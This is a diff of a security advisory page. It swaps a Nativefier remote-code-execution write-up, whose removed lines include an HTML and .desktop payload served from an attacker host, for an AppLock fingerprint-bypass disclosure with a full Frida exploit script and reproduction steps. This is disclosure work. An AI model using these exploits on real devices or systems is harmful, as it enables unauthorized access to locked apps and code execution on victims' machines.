@@ -1,17 +1,17 @@
 ---
 slug: advisories/walker/
-title: Nativefier 49.0.1 - RCE via malicious URI schemes
+title: AppLock 7.9.29 - Improper Access Control - Fingerprint
 authors: Carlos Bello
 writer: cbello
 codename: walker
-product: Nativefier 49.0.1
-date: 2022-09-08 20:30 COT
+product: AppLock 7.9.29
+date: 2022-09-26 06:00 COT
 cveid: CVE-2022-1959
-severity: 8.8
-description: Nativefier 49.0.1  -  RCE via malicious URI schemes
-keywords: Fluid Attacks, Security, Vulnerabilities, Nativefier
+severity: 5.5
+description: AppLock 7.9.29  -  Improper Access Control - Fingerprint
+keywords: Fluid Attacks, Security, Vulnerabilities, AppLock, spsoftmobile, spsoft, Fingerprint
 banner: advisories-bg
-advise: no
+advise: yes
 template: advisory
 ---
 
@@ -19,133 +19,132 @@ template: advisory
 
 |                       |                                                        |
 | --------------------- | -------------------------------------------------------|
-| **Name**              | Nativefier 49.0.1 - RCE via malicious URI schemes      |
+| **Name**              | AppLock 7.9.29 - Improper Access Control - Fingerprint |
 | **Code name**         | [Walker](https://en.wikipedia.org/wiki/Alan_Walker)    |
-| **Product**           | Nativefier                                             |
-| **Affected versions** | Version 49.0.1                                         |
-| **State**             | Private                                                |
-| **Release date**      | 2022-09-08                                             |
+| **Product**           | AppLock (Fingerprint)                                  |
+| **Affected versions** | Version 7.9.29                                         |
+| **State**             | Public                                                 |
+| **Release date**      | 2022-09-26                                             |
 
 ## Vulnerability
 
 |                       |                                                                                                        |
 | --------------------- | ------------------------------------------------------------------------------------------------------ |
-| **Kind**              | Remote command execution                                                                               |
-| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)            |
+| **Kind**              | Improper Access Control - Fingerprint                                                                  |
+| **Rule**              | [115. Security controls bypass or absence](https://docs.fluidattacks.com/criteria/vulnerabilities/115) |
 | **Remote**            | Yes                                                                                                    |
-| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H                                                           |
-| **CVSSv3 Base Score** | 8.8                                                                                                    |
+| **CVSSv3 Vector**     | CVSS:3.1/AV:P/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N                                                           |
+| **CVSSv3 Base Score** | 5.5                                                                                                    |
 | **Exploit available** | Yes                                                                                                    |
 | **CVE ID(s)**         | [CVE-2022-1959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1959)                          |
 
 ## Description
 
-Nativefier version 49.0.1 allows an external attacker to execute
-arbitrary commands remotely on any client that has used nativefier
-to convert an infected web application into a desktop application.
-This is made possible by the application not properly validating
-the scheme/protocol of the external links it opens with the
-shell.openExternal function.
+AppLock version 7.9.29 allows an attacker with physical access to
+the device to bypass biometric authentication. This is possible
+because the application did not correctly implement fingerprint
+validations.
 
 ## Vulnerability
 
-This vulnerability occurs due to improper scheme/protocol validation
-of external URLs:
+In android application fingerprint implementations, the
+onAuthenticationSucceded method is triggered when the system
+successfully authenticates a user. Most biometric authentication
+implementations rely on this method being called, without worrying
+about the CryptoObject. The application logic responsible for
+unlocking the application is usually included in this callback method.
+This approach is trivially exploited by connecting to the application
+process and calling the AuthenticationSucceded method directly, as a
+result, the application can be unlocked without providing valid
+biometric data.
 
-* https://github.com/nativefier/nativefier/blob/60035a8e74e3794bac16fb5945780b9be514b164/app/src/helpers/windowEvents.ts#L62-L98
+Another common case occurs when some developers use CryptoObject but do not
+encrypt/decrypt data that is crucial for the application to function properly.
+Therefore, we could skip the authentication step altogether and proceed to use
+the application. To solve this there is no single answer, however a good approach
+is to use a fingerprint protected key store key that will be used to decrypt a
+symmetric key. This symmetric key must be used to decrypt the application storage.
 
-![](https://user-images.githubusercontent.com/51862990/189242160-4ef651cc-edcf-4e42-b4f3-8b01ff1cbf6b.png)
+I attach the following link so that you can better understand the vulnerability
+present in AppLock:
 
-* https://github.com/nativefier/nativefier/blob/60035a8e74e3794bac16fb5945780b9be514b164/app/src/helpers/helpers.ts#L118-L163
+* https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication/
 
-![](https://user-images.githubusercontent.com/51862990/189242188-35d26936-a8da-4eef-9f98-f6f776c537d2.png)
+## Steps to reproduce
 
-* https://github.com/nativefier/nativefier/blob/60035a8e74e3794bac16fb5945780b9be514b164/app/src/helpers/helpers.ts#L169-L175
+1. Install and configure AppLock.
 
-![](https://user-images.githubusercontent.com/51862990/189242216-7302a556-e9d3-47d4-ad4b-fb1345d553cd.png)
+2. Activate and configure fingerprint protection in AppLock.
 
-With these three screenshots we can demonstrate what was mentioned at
-the beginning. Basically what the application is doing is sending to
-shell.openExternal(url), any url that is not related to the origin of
-the web application that was converted to a desktop application.
+3. Install and configure frida as indicated in the following [link](https://programmerclick.com/article/51481638343/).
 
-For example, if we execute the command:
+4. Start AppLock on your device, if you set everything up correctly, you should now
+   see a prompt to put your fingerprint.
+
+5. Run the following command on your laptop.
 
 ```bash
-nativefier 'http://cbelloatfluid.com'
+'frida -U AppLock -l exploit.js --no-pause'
 ```
 
-And within that website there is a link pointing to http://something.com,
-that link will be external, and therefore it will be opened with the
-shell.openExternal function. Since the scheme/protocol of these links
-is not validated, an attacker could infect legitimate web pages with
-malicious JS code, so there will be potentially malicious links that
-will result in remote code execution for any user who has used this
-tool to generate the desktop version of the web page.
+6. Now on your device press the 'recent' button, commonly represented by a square.
+   This button opens the recent apps view so that you can switch from one open app
+   to another.
 
-## Exploitation requirements
+7. Log back into AppLock.
 
-To achieve the RCE, the attacker will abuse certain schemes/protocols.
-Some of these only work on windows, others on MACos, others only work
-correctly under certain specific Linux distributions. In my case, I
-used Xubuntu 20.04 (Xfce) to simulate a victim. I chose this distribution
-because in its default configuration it executes the payload.desktop file
-after mounting the remote location where the payload file is located.
-In other Linux distributions by default these files are not executed once
-the remote location is mounted.
-
-Below I will provide you with support material so that you can understand
-in greater depth what I have just explained:
-
-* https://positive.security/blog/url-open-rce#windows-10-19042
+8. Now all you have to do is log in again. This time you will enter the application
+   instantly, without having entered a valid fingerprint.
 
 ## Exploitation
 
-To exploit this vulnerability, you must host the following files on a server:
+### exploit.js
 
-### exploit.html
+```js
+// exploit.js
+const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(
+    crypto, null, 0
+);
 
-```html
-<!DOCTYPE html>
-<html>
-    <body>
-        <script>
-            window.open("sftp://user@server/uploads/payload.desktop");
-        </script>
-    </body>
-</html>
+const exploit = () => {
+    console.log("[+] Hooking PassphrasePromptActivity - Method resumeScreenLock");
+    const AuthenticationResult = Java.use(
+        'android.hardware.fingerprint.FingerprintManager$AuthenticationResult'
+    );
+    const FingerprintManager  = Java.use(
+        'android.hardware.fingerprint.FingerprintManager'
+    );
+    const CryptoObject = Java.use(
+        'android.hardware.fingerprint.FingerprintManager$CryptoObject'
+    );
+
+    console.log("Hooking FingerprintManagerCompat.authenticate()...");
+    const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload(
+        'android.hardware.fingerprint.FingerprintManager$CryptoObject',
+        'android.os.CancellationSignal',
+        'int',
+        'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
+        'android.os.Handler'
+    );
+
+    fingerprintManager_authenticate.implementation = (
+        crypto, cancel, flags, callback, handler) => {
+        console.log("Bypass Lock Screen - Fingerprint");
+
+        // We send a null cryptoObject to the listener of the fingerprint
+        var crypto = CryptoObject.$new(null);
+        var authenticationResult = getAuthResult(AuthenticationResult, crypto);
+        callback.onAuthenticationSucceeded(authenticationResult);
+        return this.authenticate(crypto, cancel, flags, callback, handler);
+    }
+}
+
+Java.perform(() => exploit());
 ```
-
-### payload.desktop
-
-In the Exec parameter you put the command you want the victim to execute.
-
-```bash
-[Desktop Entry]
-Exec=xmessage "RCE by cbelloatfluid"
-Type=Application
-```
-
-The **exploit.html** file will be saved in the root folder of your apache
-server, while the payload.desktop file will be uploaded to the root folder
-of your sftp/ftp server. In my case, I set up both services on the same
-server.
-
-With all the above done, now the client would only have to execute the
-following command:
-
-```bash
-nativefier 'http://attacker-server.com/exploit.html'
-```
-
-Recall that in a real scenario, an attacker would infect a legitimate web
-application with malicious JS code. This scenario is much more common and
-therefore the attacker would have a higher success rate of exploitation,
-performing untargeted attacks.
 
 ## Evidence of exploitation
 
-![RCE-nativefier](https://user-images.githubusercontent.com/51862990/189242082-e3099152-713a-4dea-ae0f-d36db4999bcb.gif)
+![applock-fingerprint-bypass](https://user-images.githubusercontent.com/51862990/192392091-e6ff1169-93d4-4c5b-ba61-59fdbf7841a8.gif)
 
 ## Our security police
 
@@ -155,9 +154,9 @@ We have reserved the CVE-2022-1959 to refer to this issue from now on.
 
 ## System Information
 
-* Version: Nativefier 49.0.1
+* Version: AppLock (Fingerprint) 7.9.29
 
-* Operating System: GNU/Linux - Xubuntu 20.04 (Xfce)
+* Operating System: Android 8.0 (API 26)
 
 ## Mitigation
 
@@ -171,7 +170,7 @@ Team of `Fluid Attacks`.
 
 ## References
 
-**Vendor page** <https://github.com/nativefier/nativefier>
+**Vendor page** <https://www.spsoftmobile.com>
 
 ## Timeline
 
@@ -179,7 +178,7 @@ Team of `Fluid Attacks`.
   discovered="2022-09-06"
   contacted="2022-09-07"
   replied=""
-  confirmed="2022-09-00"
+  confirmed=""
   patched=""
-  disclosure="2022-09-00">
+  disclosure="2022-09-26">
 </time-lapse>
